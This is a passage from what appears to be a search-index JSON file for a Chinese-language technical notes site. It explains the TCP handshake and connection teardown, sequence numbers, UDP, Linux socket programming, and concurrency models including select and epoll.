<p>\u5f53A\u53d1\u8d77\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\uff0c\u4f1a\u6709\u5f88\u591a\u79cd\u53ef\u80fd\uff0c\u6bd4\u5982\u5305\u4e22\u4e86\u3001\u8d85\u65f6\u4e86\u3001B\u6ca1\u6709\u54cd\u5e94\u7b49\u7b49\u3002A\u65e0\u6cd5\u786e\u8ba4\u7ed3\u679c\uff0c\u53ea\u80fd\u91cd\u590d\u53d1\u9001\uff0c\u5373\u4f7fB\u6536\u5230\u4e86\uff0c\u4f46A\u4e0d\u77e5\u9053\uff0c\u8fd8\u662f\u53ef\u80fd\u518d\u53d1\u3002</p> <p>B\u6536\u5230\u4ee5\u540e\uff0c\u5c31\u77e5\u9053\u4e86A\u7684\u5b58\u5728\uff0c\u4ee5\u53caA\u60f3\u548c\u5b83\u5efa\u7acb\u8fde\u63a5\u3002B\u82e5\u613f\u610f\u5efa\u7acb\u8fde\u63a5\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u53d1\u9001\u4e00\u4e2a\u5e94\u7b54\u5305\uff0c\u4f46\u5b83\u82e5\u4e0d\u80fd\u786e\u5b9a\u8fd9\u4e2a\u5e94\u7b54\u5305A\u6536\u5230\u4e86\uff0c\u4e5f\u5c31\u4e0d\u80fd\u8ba4\u4e3a\u5f53\u524d\u7684\u8fde\u63a5\u4ee5\u53ca\u5efa\u7acb\u597d\u4e86\u3002\u6240\u4ee5\u4e24\u6b21\u63e1\u624b\u80af\u5b9a\u662f\u4e0d\u884c\u7684\u3002</p> <p>A\u63a5\u6536\u5230\u5e94\u7b54\u5305\u4e4b\u540e\uff0c\u5bf9\u4e8eA\u6765\u8bf4\u5b83\u7684\u6d88\u606f\u6709\u53bb\u6709\u56de\uff0cA\u53ef\u4ee5\u8ba4\u4e3a\u8fde\u63a5\u662f\u5efa\u7acb\u7684\uff0c\u5b83\u518d\u53d1\u9001\u5e94\u7b54\u4e4b\u5e94\u7b54\uff0c\u5230\u4e86B\u4e4b\u540e\uff0cB\u624d\u8ba4\u4e3a\u5b83\u7684\u6d88\u606f\u4e5f\u662f\u6709\u53bb\u6709\u56de\u7684\uff0cB\u624d\u80fd\u786e\u8ba4\u8fde\u63a5\u662f\u5efa\u7acb\u7684\u3002</p> <p>\u521d\u59cb\u5316\u5e8f\u5217\u53f7</p> <p>\u7f51\u7edc\u7684\u4e0d\u786e\u5b9a\u6027\u4f1a\u5bfc\u81f4\u6570\u636e\u5305\u7684\u4e22\u5931\u3001\u987a\u5e8f\u98a0\u5012\u3001\u91cd\u590d\u53d1\u9001\u7b49\u95ee\u9898\uff0c\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0cTCP\u534f\u8bae\u5c31\u8981\u6c42\u53d1\u9001\u65b9\u5728\u6570\u636e\u5305\u79cd\u52a0\u5165\u5e8f\u5217\u53f7\u5b57\u6bb5\uff0c\u6709\u4e86\u5e8f\u5217\u53f7\uff0c\u63a5\u6536\u65b9\u5c31\u53ef\u4ee5\u901a\u8fc7\u5e8f\u5217\u53f7\u6765\u5bf9\u6570\u636e\u5305\u53bb\u91cd\u548c\u6392\u5e8f\uff0c\u53d1\u9001\u65b9\u5c31\u53ef\u4ee5\u5728\u5bf9\u5e94\u7684\u6570\u636e\u5305\u672a\u88abACK\u65f6\u8fdb\u884c\u91cd\u590d\u53d1\u9001\u3002</p> <p>\u65e2\u7136\u5e8f\u5217\u53f7\u7684\u610f\u4e49\u5982\u6b64\u91cd\u8981\uff0c\u90a3\u4e48\u5728\u5efa\u7acb\u8fde\u63a5\u7684\u65f6\u5019\u5c31\u9700\u8981\u628a\u5e8f\u5217\u53f7\u521d\u59cb\u5316\u597d\u3002A\u548cB\u53cc\u65b9\u90fd\u9700\u8981\u5411\u5bf9\u65b9\u53d1\u9001SYN\u63a7\u5236\u6d88\u606f\u5e76\u643a\u5e26\u81ea\u5df1\u671f\u671b\u7684\u521d\u59cb\u5316\u5e8f\u5217\u53f7SEQ\uff0c\u5bf9\u65b9\u5728\u6536\u5230SYN\u6d88\u606f\u540e\u4f1a\u56de\u590dACK\u63a7\u5236\u6d88\u606f\u4ee5\u53caSEQ+1\u6765\u8fdb\u884c\u786e\u8ba4\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u8868\u793a\u4e3a:  \u6211\u4eec\u9700\u8981\u56db\u6761\u6d88\u606f\u624d\u80fd\u628a\u5e8f\u5217\u53f7\u521d\u59cb\u5316\u597d\uff0c\u7531\u4e8eTCP\u6d88\u606f\u5934\u7684\u8bbe\u8ba1\uff0cB\u5411A\u53d1\u9001\u65f6\u53ef\u4ee5\u4e00\u6b21\u6027\u53d1\u9001SYN\u548cACK\u6d88\u606f\uff0c\u6240\u4ee5\u57fa\u4e8e\u521d\u59cb\u5316\u5e8f\u5217\u53f7\uff0c\u6211\u4eec\u4e5f\u662f\u9700\u8981\u4e09\u6b21\u63e1\u624b\u7684\u3002</p> <p>\u5386\u53f2\u8fde\u63a5</p> <p>\u6b64\u5916\uff0cA\u591a\u6b21\u53d1\u9001\u5efa\u7acb\u8fde\u63a5\u7684\u8bf7\u6c42\uff0c\u5f53\u7f51\u7edc\u72b6\u51b5\u8f83\u5dee\u65f6\uff0cB\u53ea\u80fd\u63a5\u53d7\u6216\u62d2\u7eddA\u7684\u8bf7\u6c42\uff0c\u5982\u679c\u53ea\u6709\u4e24\u6b21\u63e1\u624b\uff0cB\u5e76\u4e0d\u6e05\u695a\u8fd9\u4e00\u6b21\u7684\u8bf7\u6c42\u662f\u4e0d\u662f\u7531\u4e8e\u7f51\u7edc\u963b\u585e\u800c\u65e9\u5df2\u8fc7\u671f\u7684\u8bf7\u6c42\u3002</p> <p>TCP\u5728\u8fde\u63a5\u65f6\u5f15\u5165\u4e86RST\u6d88\u606f\uff0c\u5f53\u63a5\u6536\u65b9\u53d1\u56de\u7ed9\u53d1\u9001\u65b9<code>ACK, seq+1</code>\u65f6\uff0c\u53d1\u9001\u65b9\u5c31\u53ef\u4ee5\u6839\u636e\u65f6\u95f4\u6765\u5224\u65ad\u8fd9\u662f\u4e0d\u662f\u4e00\u6761\u8fc7\u671f\u8d85\u65f6\u7684\u6d88\u606f\uff0c\u5982\u679c\u662f\uff0c\u53d1\u9001\u65b9\u5c31\u4f1a\u53d1<code>RST</code>\u6765\u4e2d\u6b62\u8fd9\u4e00\u6b21\u8fde\u63a5\u3002</p> <p>\u6240\u4ee5\uff0c\u4e09\u6b21\u63e1\u624b\u548cRST\u624d\u80fd\u8ba9\u53d1\u9001\u7684\u53cc\u65b9\u6709\u8db3\u591f\u7684\u4fe1\u606f\u53bb\u5224\u65ad\u5f53\u524d\u7684\u8fde\u63a5\u662f\u5426\u662f\u9519\u8bef\u7684\u6216\u8005\u8fc7\u671f\u7684\u3002</p>"},{"location":"other/protocol/#_4","title":"\u56db\u6b21\u6325\u624b","text":"<p>TCP\u5173\u95ed\u8fde\u63a5\u7684\u8fc7\u7a0b\u53ef\u4ee5\u7528\u72b6\u6001\u65f6\u5e8f\u56fe\u8868\u793a\u4e3a: </p> <p>\u548c\u5efa\u7acb\u8fde\u63a5\u4e0d\u540c\uff0c\u5173\u95ed\u8fde\u63a5\u9700\u8981\u56db\u6b65\u3002A\u4f5c\u4e3a\u4e3b\u52a8\u5173\u95ed\u65b9\uff0c\u5148\u53d1\u9001FIN\uff0c\u6536\u5230B\u7684ACK\u540e\uff0cA\u8fdb\u5165\u534a\u5173\u95ed\u72b6\u6001\u4e0d\u80fd\u518d\u53d1\u9001\u4f20\u8f93\u6570\u636e\u3002\u6b64\u65f6\uff0cB\u8fdb\u5165\u5230\u4e86CLOSE_WAIT\u72b6\u6001\uff0c\u8fd9\u4e2a\u72b6\u6001\u662f\u4e3a\u4e86\u8ba9B\u53d1\u9001\u8fd8\u672a\u4f20\u8f93\u5b8c\u7684\u6570\u636e\uff0c\u4f20\u5b8c\u4e4b\u540eB\u624d\u80fd\u53d1\u51faFIN\uff0c\u7b49\u5230A\u56de\u7684ACK\uff0cB\u5173\u95ed\u8fde\u63a5\u3002</p> <p>\u4f46\u6b64\u65f6A\u8fdb\u5165TIME_WAIT\u72b6\u6001\uff0c\u56e0\u4e3a\u5b83\u6ca1\u6cd5\u77e5\u9053ACK\u662f\u5426\u5230\u8fbeB\u3002\u5b83\u7b49\u7684\u7ed3\u679c\u65e0\u975e\u662f\u4e24\u79cd\uff0c\u8981\u4e48B\u6ca1\u6709\u6536\u5230ACK\uff0c\u90a3\u4e48B\u5c31\u4e00\u5b9a\u4f1a\u4e3a\u5b83\u7684FIN\u6d88\u606f\u8fdb\u884c\u8d85\u65f6\u91cd\u4f20\uff0cA\u5c31\u9700\u8981\u6536\u5230FIN\u4e4b\u540e\u518d\u6b21\u53d1\u9001ACK\uff1b\u8981\u4e48B\u6536\u5230ACK\u4e86\uff0c\u90a3\u4e48A\u5c31\u53ef\u4ee5\u5173\u95ed\u4e86\uff0c\u7b49\u5f85\u65f6\u95f4\u81f3\u5c11\u662fB\u7684timeout+FIN\u7684\u4f20\u8f93\u65f6\u95f4\uff0c\u4e3a\u4fdd\u8bc1\u53ef\u9760\uff0c\u91c7\u7528\u4e86\u66f4\u52a0\u4fdd\u5b88\u7684\u7b49\u5f85\u65f6\u95f42MSL(Maximum Segment Life)\u3002</p>"},{"location":"other/protocol/#_5","title":"\u72b6\u6001\u673a","text":"<p>\u5c06\u5efa\u7acb\u8fde\u63a5\u548c\u5173\u95ed\u8fde\u63a5\u7684\u4e24\u4e2a\u65f6\u5e8f\u56fe\u5408\u8d77\u6765\u5c31\u662f\u8457\u540d\u7684TCP\u72b6\u6001\u673a\uff1a </p>"},{"location":"other/protocol/#_6","title":"\u6d41\u91cf\u63a7\u5236","text":""},{"location":"other/protocol/#_7","title":"\u62e5\u585e\u63a7\u5236","text":""},{"location":"other/protocol/#udp","title":"UDP","text":""},{"location":"other/protocol/#_8","title":"\u5305\u5934\u683c\u5f0f","text":"<p>\u548cTCP\u76f8\u6bd4\uff0cUDP\u5177\u6709\u975e\u5e38\u7b80\u5355\u7684\u5305\u5934\u683c\u5f0f\uff0c\u53ef\u4ee5\u8bf4\u9664\u4e86\u7aef\u53e3\u53f7\u5c31\u6ca1\u6709\u4ec0\u4e48\u4e86\u3002\u5b83\u4e0d\u4f1a\u53bb\u5efa\u7acb\u8fde\u63a5\uff0c\u53ea\u8981\u76d1\u542c\u76f8\u5e94\u7684\u7aef\u53e3\u53f7\uff0c\u8c01\u90fd\u53ef\u4ee5\u4f20\u7ed9\u4ed6\u6570\u636e\uff0c\u4ed6\u4e5f\u53ef\u4ee5\u4f20\u7ed9\u4efb\u4f55\u4eba\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u540c\u65f6\u4f20\u7ed9\u591a\u4e2a\u4eba\u6570\u636e\u3002</p>"},{"location":"other/protocol/#tcp_1","title":"\u4e0eTCP\u6bd4\u8f83","text":"<p>TCP\u662f\u9762\u5411\u8fde\u63a5\u7684\uff0c\u800cUDP\u662f\u9762\u5411\u65e0\u8fde\u63a5\u7684\u3002\u6240\u8c13\u5efa\u7acb\u8fde\u63a5\uff0c\u5c31\u662f\u4e3a\u4e86\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4e4b\u95f4\u7ef4\u62a4\u8fde\u63a5\uff0c\u901a\u8fc7\u4e00\u5b9a\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ef4\u6301\u53cc\u65b9\u4ea4\u4e92\u7684\u72b6\u6001\uff0c\u6765\u4fdd\u8bc1\u9762\u5411\u8fde\u63a5\u7684\u7279\u6027\u3002</p> <p>TCP\u63d0\u4f9b\u7684\u662f\u53ef\u9760\u4ea4\u4ed8\uff0c\u901a\u8fc7\u5e8f\u53f7\u53ef\u4ee5\u4fdd\u8bc1\u5305\u4e0d\u4e22\u5931\u3001\u4e0d\u91cd\u590d\u3001\u6309\u5e8f\u5230\u8fbe\uff0c\u4f46UDP\u662f\u4e0d\u4fdd\u8bc1\u4e0d\u4e22\u5931\uff0c\u4e5f\u4e0d\u4fdd\u8bc1\u6309\u987a\u5e8f\u5230\u8fbe\u3002</p> <p>TCP\u9762\u5411\u5b57\u8282\u6d41\uff0c\u53d1\u9001\u7684\u65f6\u5019\u53d1\u7684\u662f\u4e00\u4e2a\u6d41\uff0c\u6ca1\u5934\u6ca1\u5c3e\u3002\u800cUDP\u7ee7\u627fIP\u5305\u7684\u7279\u6027\uff0c\u57fa\u4e8e\u6570\u636e\u62a5\uff0c\u4e00\u4e2a\u4e2a\u5730\u53d1\uff0c\u4e00\u4e2a\u4e2a\u5730\u6536\u3002</p> <p>TCP\u662f\u53ef\u4ee5\u8fdb\u884c\u62e5\u585e\u63a7\u5236\u7684\uff0c\u5b83\u4f1a\u6839\u636e\u7f51\u7edc\u73af\u5883\u8c03\u6574\u81ea\u5df1\u53d1\u9001\u7684\u5feb\u6162\uff0c\u800cUDP\u5c31\u4e0d\u4f1a\u3002</p> <p>TCP\u662f\u6709\u72b6\u6001\u7684\uff0cUDP\u662f\u65e0\u72b6\u6001\u7684\u3002</p>"},{"location":"other/protocol/#_9","title":"\u4f7f\u7528\u573a\u666f","text":"<p>\u57fa\u4e8eUDP\u7684\u7279\u70b9\uff0c\u5b83\u9002\u5408\u4e8e\u8fd9\u4e9b\u4f7f\u7528\u573a\u666f:</p> <ol> <li>\u9700\u8981\u8d44\u6e90\u5c11\uff0c\u5728\u7f51\u7edc\u60c5\u51b5\u8f83\u597d\u7684\u5185\u7f51\u6216\u8005\u5bf9\u4e8e\u4e22\u5305\u4e0d\u654f\u611f\u7684\u5e94\u7528</li> <li>\u65e0\u9700\u4e00\u5bf9\u4e00\u6c9f\u901a\uff0c\u5efa\u7acb\u8fde\u63a5\uff0c\u800c\u662f\u53ef\u4ee5\u5e7f\u64ad\u7684\u5e94\u7528</li> <li>\u9700\u8981\u5904\u7406\u901f\u5ea6\u5feb\uff0c\u65f6\u5ef6\u4f4e\uff0c\u53ef\u4ee5\u5bb9\u5fcd\u5c11\u6570\u4e22\u5305\uff0c\u4f46\u8981\u6c42\u5373\u4fbf\u62e5\u585e\u4e5f\u4e00\u5f80\u65e0\u524d\u7684\u65f6\u5019</li> </ol>"},{"location":"other/protocol/#socket","title":"Socket","text":"<p>Socket\u5728Linux\u4e2d\u4ee5\u6587\u4ef6\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u5b83\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u662f\u5bf9<code>\u6253\u5f00open \u2013&gt; \u8bfb\u5199write/read \u2013&gt; \u5173\u95edclose</code>\u6a21\u5f0f\u7684\u4e00\u4e2a\u5b9e\u73b0\u3002</p> <p>\u5728\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u901a\u4fe1\u4e4b\u524d\uff0c\u53cc\u65b9\u90fd\u8981\u5efa\u7acb\u4e00\u4e2aSocket\uff0c\u6307\u5b9a\u662fIPv4\u8fd8\u662fIPv6\uff0c\u662f\u57fa\u4e8e\u6570\u636e\u6d41SOCK_STREAM\u7684(TCP)\u8fd8\u662f\u57fa\u4e8e\u6570\u636e\u62a5SOCK_DGRAM\u7684(UDP)\u3002</p>"},{"location":"other/protocol/#tcp_2","title":"\u57fa\u4e8eTCP","text":"<p>\u57fa\u4e8eTCP\u534f\u8bae\u7684Socket\u7a0b\u5e8f\u51fd\u6570\u7684\u8c03\u7528\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a:</p> <p></p> <p>\u670d\u52a1\u7aef\u5148\u8c03\u7528bind\u51fd\u6570\u4e3a\u8be5socket\u8d4b\u4e88\u4e00\u4e2aIP\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6709\u4e86\u5b83\u5c31\u53ef\u4ee5\u8c03\u7528listen\u51fd\u6570\u8fdb\u5165\u76d1\u542c\u72b6\u6001\uff0c\u5ba2\u6237\u7aef\u5c31\u53ef\u4ee5\u53d1\u8d77\u8fde\u63a5\u3002</p> <p>\u670d\u52a1\u7aef\u5185\u6838\u4e3a\u6bcf\u4e2aSocket\u7ef4\u62a4\u4e86\u4e24\u4e2a\u961f\u5217\u3002\u4e00\u4e2a\u961f\u5217\u662f\u5df2\u7ecf\u5efa\u7acb\u4e86\u8fde\u63a5\u7684\uff0c\u4e09\u6b21\u63e1\u624b\u5df2\u5b8c\u6210\uff0c\u5904\u4e8eESTABLISHED\u72b6\u6001\uff1b\u53e6\u4e00\u4e2a\u662f\u8fd8\u6ca1\u6709\u5b8c\u5168\u5efa\u7acb\u8fde\u63a5\u7684\uff0c\u5904\u4e8eSYN_RCVD\u72b6\u6001\u3002</p> <p>\u63a5\u7740\uff0c\u670d\u52a1\u7aef\u8c03\u7528accept\u51fd\u6570\u65f6\uff0c\u4f1a\u62ff\u51fa\u4e00\u4e2a\u5df2\u5b8c\u6210\u7684\u8fde\u63a5\u8fdb\u884c\u5904\u7406\u3002\u5982\u679c\u6ca1\u6709\u5df2\u5b8c\u6210\u7684\u8fde\u63a5\uff0c\u5c31\u8981\u7b49\u7740\u3002\u670d\u52a1\u7aef\u7b49\u5f85\u7684\u65f6\u5019\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u901a\u8fc7connect\u51fd\u6570\u53d1\u8d77\u8fde\u63a5\uff0csocket\u51fd\u6570\u4e2d\u58f0\u660e\u8981\u8fde\u63a5\u7684IP\u5730\u5740\u548c\u7aef\u53e3\u53f7\uff0c\u7136\u540e\u53d1\u8d77\u4e09\u6b21\u63e1\u624b\uff0c\u4e00\u65e6\u63e1\u624b\u6210\u529f\uff0c\u670d\u52a1\u7aef\u7684accept\u51fd\u6570\u4f1a\u8fd4\u56de\u53e6\u4e00\u4e2asocket\u3002</p> <p>\u6240\u4ee5\uff0c\u670d\u52a1\u7aef\u76d1\u542c\u7528\u7684socket\u548c\u771f\u6b63\u7528\u6765\u4f20\u8f93\u6570\u636e\u7684socket\u662f\u4e24\u4e2a\uff0c\u5206\u522b\u53eb\u505a\u76d1\u542cSocket\u548c\u5df2\u8fde\u63a5Socket\u3002\u8fde\u63a5\u5efa\u7acb\u6210\u529f\u540e\uff0c\u53cc\u65b9\u5f00\u59cb\u901a\u8fc7read\u548cwrite\u51fd\u6570\u8bfb\u5199\u6570\u636e\u3002</p> <p>\u5185\u6838\u4e2d\u65e2\u7136socket\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u90a3\u5c31\u6709\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u4e2atask_struct\u6570\u7ec4\uff0c\u91cc\u9762\u6307\u5411\u8be5\u8fdb\u7a0b\u6253\u5f00\u7684\u6240\u6709\u6587\u4ef6\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u53ef\u4ee5\u7406\u89e3\u4e3a\u6570\u7ec4\u7684index\u3002\u6bcf\u4e2a\u6587\u4ef6\u53c8\u4f1a\u6709\u4e00\u4e2ainode\uff0csocket\u5bf9\u5e94\u7684inode\u4e0d\u50cf\u666e\u901a\u6587\u4ef6\u653e\u5728\u786c\u76d8\u4e0a\uff0c\u800c\u662f\u5728\u5185\u5b58\u4e2d\uff0c\u8fd9\u4e2ainode\u6307\u5411\u4e86socket\u5728\u5185\u6838\u4e2d\u7684Socket\u7ed3\u6784:</p> <p></p> <p>\u8fd9\u4e2aSocket\u7ed3\u6784\u4e3b\u8981\u662f\u4e24\u4e2a\u961f\u5217\uff0c\u53d1\u9001\u961f\u5217\u548c\u63a5\u6536\u961f\u5217\uff0c\u961f\u5217\u91cc\u9762\u4fdd\u5b58\u7684\u662f\u7f13\u5b58sk_buff\uff0c\u6bcf\u4e2ask_buff\u5c31\u80fd\u770b\u5230\u5b8c\u6574\u7684\u5305\u7684\u7ed3\u6784\u3002</p>"},{"location":"other/protocol/#udp_1","title":"\u57fa\u4e8eUDP","text":"<p>\u7531\u4e8eUDP\u7684\u8fc7\u7a0b\u975e\u5e38\u7b80\u5355\uff0c\u6ca1\u6709\u5efa\u7acb\u8fde\u63a5\uff0c\u6ca1\u6709\u4e09\u6b21\u63e1\u624b\uff0c\u53ea\u9700\u8981\u7ed1\u5b9aIP\u548c\u7aef\u53e3\u53f7\u3002\u800c\u4e14\u65e0\u9700\u7ef4\u62a4\u8fde\u63a5\u72b6\u6001\uff0c\u670d\u52a1\u7aef\u4e5f\u5c31\u4e0d\u9700\u4e3a\u6bcf\u5bf9\u8fde\u63a5\u5efa\u7acb\u4e00\u7ec4socket\uff0c\u53ea\u9700\u8981\u4e00\u4e2asocket\u5c31\u80fd\u548c\u591a\u4e2a\u5ba2\u6237\u7aef\u901a\u4fe1\uff0c\u800c\u4e14\u6bcf\u6b21\u901a\u4fe1\u7684\u65f6\u5019\u901a\u8fc7\u8c03\u7528sendto\u548crecvfrom\u8fd8\u80fd\u518d\u4f20\u5165IP\u5730\u5740\u548c\u7aef\u53e3\u3002</p> <p></p>"},{"location":"other/protocol/#_10","title":"\u5e76\u53d1\u5904\u7406","text":"<p>\u901a\u8fc7\u4e4b\u524d\u7684\u57fa\u4e8eTCP\u6216UDP\u7684socket\u51fd\u6570\u5efa\u7acb\u8fde\u63a5\u4e4b\u540e\uff0c\u9700\u8981\u4e00\u4e2awhile\u5faa\u73af\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4e0d\u65ad\u7684\u63a5\u6536\u6570\u636e\uff0c\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u57fa\u672c\u7684\u7f51\u7edc\u4ea4\u4e92\u7a0b\u5e8f\u3002\u4f46\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4e00\u5bf9\u4e00\u7684\uff0c\u5982\u4f55\u8ba9\u670d\u52a1\u7aef\u80fd\u670d\u52a1\u66f4\u591a\u7684\u5ba2\u6237\u7aef\u5462\uff1f</p>"},{"location":"other/protocol/#_11","title":"\u591a\u8fdb\u7a0b","text":"<p>\u5f53\u5efa\u7acb\u8fde\u63a5\u4e4b\u540e\uff0c\u5c31\u4f1a\u6709\u4e00\u4e2a\u5df2\u8fde\u63a5\u7684socket\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5fork\u51fa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u628a\u63a5\u4e0b\u6765\u7684\u6570\u636e\u63a5\u6536\u7684\u4e8b\u60c5\u4ea4\u7ed9\u5b50\u8fdb\u7a0b\u6765\u505a\u3002\u5728Linux\u5185\u6838\uff0c\u5b50\u8fdb\u7a0b\u4f1a\u590d\u5236\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u5217\u8868\uff0c\u4ee5\u53ca\u5185\u5b58\u7a7a\u95f4\uff0c\u8fd8\u6709\u5f53\u524d\u6267\u884c\u5230\u7a0b\u5e8f\u7684\u54ea\u4e00\u6761\u8bed\u53e5\u3002\u4e4b\u524d\u7236\u8fdb\u7a0baccept\u4e4b\u540e\u521b\u5efa\u7684\u5df2\u8fde\u63a5socket\u4e5f\u662f\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5c31\u4f1a\u88ab\u5b50\u8fdb\u7a0b\u83b7\u5f97\u3002\u5b50\u8fdb\u7a0b\u901a\u4fe1\u5b8c\u6bd5\u540e\uff0c\u5c31\u9700\u8981\u9000\u51fa\uff0c\u9700\u8981\u7236\u8fdb\u7a0b\u901a\u8fc7\u5b50\u8fdb\u7a0bPID\u6765\u67e5\u770b\u5b83\u662f\u5426\u9700\u8981\u9000\u51fa\u3002</p>"},{"location":"other/protocol/#_12","title":"\u591a\u7ebf\u7a0b","text":"<p>\u6bcf\u6b21\u548c\u4e00\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\u5c31\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\u662f\u5f88\u5962\u4f88\u7684\u4e8b\u60c5\uff0c\u76f8\u5bf9\u800c\u8a00\uff0c\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u5c31\u8981\u8f7b\u91cf\u7ea7\u5f88\u591a\u3002\u8fd9\u4e9b\u7ebf\u7a0b\u5171\u4eab\u6587\u4ef6\u63cf\u8ff0\u7b26\u5217\u8868\u3001\u8fdb\u7a0b\u7a7a\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5df2\u8fde\u63a5\u7684socket\u6765\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002</p> <p>\u4f46\u662f\u4e00\u53f0\u673a\u5668\u65e0\u6cd5\u521b\u5efa\u8fc7\u591a\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\uff0c\u8457\u540d\u7684C10K\u95ee\u9898\u5c31\u662f\u6307\u5355\u673a\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u7ef4\u62a4\u8fc7\u591a\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\uff0c\u5728\u65e9\u671f\u6210\u4e3a\u4e00\u4e2a\u74f6\u9888\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5c31\u53d1\u660e\u4e86IO\u591a\u8def\u590d\u7528\u7684\u65b9\u5f0f\u3002</p>"},{"location":"other/protocol/#io-select","title":"IO\u591a\u8def\u590d\u7528-select","text":"<p>select\u7684\u65b9\u5f0f\u662f\u6709\u4e00\u4e2a\u7ebf\u7a0b\u4e13\u95e8\u53bb\u76d1\u63a7\u6240\u6709\u7684socket\uff0c\u56e0\u4e3asocket\u662f\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u6240\u6709\u7684socket\u90fd\u53ef\u4ee5\u653e\u5728\u4e00\u4e2a\u53eb\u505afd_set\u7684\u96c6\u5408\u4e2d\uff0c\u7136\u540eselect\u51fd\u6570\u6765\u76d1\u542c\u8fd9\u4e2a\u96c6\u5408\u662f\u5426\u6709\u53d8\u5316\u3002\u4e00\u65e6\u6709\u53d8\u5316\uff0c\u5c31\u4f9d\u6b21\u67e5\u770b\u6bcf\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u90a3\u4e9b\u53d1\u751f\u53d8\u5316\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u5728fd_set\u4e2d\u5bf9\u5e94\u7684\u4f4d\u4f1a\u8bbe\u4e3a1\uff0c\u8868\u793asocket\u53ef\u8bfb\u6216\u53ef\u5199\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\u3002\u63a5\u7740\u518d\u6b21\u8c03\u7528select\u51fd\u6570\uff0c\u8fdb\u5165\u4e0b\u4e00\u8f6e\u53d8\u5316\u7684\u76d1\u542c\u3002</p> <p>\u4f46\u662fselect\u4ecd\u7136\u6709\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u5f53\u8fde\u63a5\u8fc7\u591a\u7684\u65f6\u5019\uff0c\u6bcf\u6b21\u90fd\u901a\u8fc7\u8f6e\u8be2\u67e5\u770b\u4e00\u904dfd_set\u6548\u7387\u4e0d\u9ad8\u3002\u5b83\u867d\u7136\u6bd4\u591a\u7ebf\u7a0b\u6548\u7387\u9ad8\u5f88\u591a\uff0c\u4f46\u4ecd\u7136\u6ca1\u6709\u5b8c\u5168\u89e3\u51b3C10K\u7684\u95ee\u9898\uff0c\u4e8e\u662f\u6709\u4e86epoll\u7684\u65b9\u6848\u3002</p> <p>\u793a\u4f8b\u7a0b\u5e8f</p>"},{"location":"other/protocol/#io-epoll","title":"IO\u591a\u8def\u590d\u7528-epoll","text":"<p>epoll\u901a\u8fc7\u6ce8\u518ccallback\u51fd\u6570\uff0c\u5f53\u67d0\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u53d1\u751f\u53d8\u5316\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u4e3b\u52a8\u901a\u77e5\u3002</p> <p>epoll_create\u4f1a\u521b\u5efa\u4e00\u4e2aepoll\u5bf9\u8c61\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u5bf9\u5e94\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5b83\u91cc\u9762\u6709\u4e00\u4e2a\u7ea2\u9ed1\u6811\uff0c\u8fd9\u4e2a\u7ea2\u9ed1\u6811\u4e2d\u5c31\u4fdd\u5b58\u7740\u8981\u76d1\u542c\u7684\u6240\u6709socket\u3002\u5f53epoll_ctl\u6dfb\u52a0\u4e00\u4e2asocket\u65f6\uff0c\u5c31\u662f\u628a\u5b83\u52a0\u5165\u8fd9\u4e2a\u7ea2\u9ed1\u6811\uff0c\u540c\u65f6\u7ea2\u9ed1\u6811\u4e2d\u7684\u8282\u70b9\u6307\u5411\u4e00\u4e2a\u7ed3\u6784\uff0c\u5e76\u5c06\u8fd9\u4e2a\u7ed3\u6784\u6302\u5728\u88ab\u76d1\u542c\u7684socket\u4e8b\u4ef6\u5217\u8868\u4e2d\u3002\u5f53\u4e00\u4e2asocket\u53d1\u751f\u4e00\u4e2a\u4e8b\u4ef6\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4ece\u8fd9\u4e2a\u5217\u8868\u4e2d\u5f97\u5230epoll\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528callback\u901a\u77e5\u5b83\u3002</p> 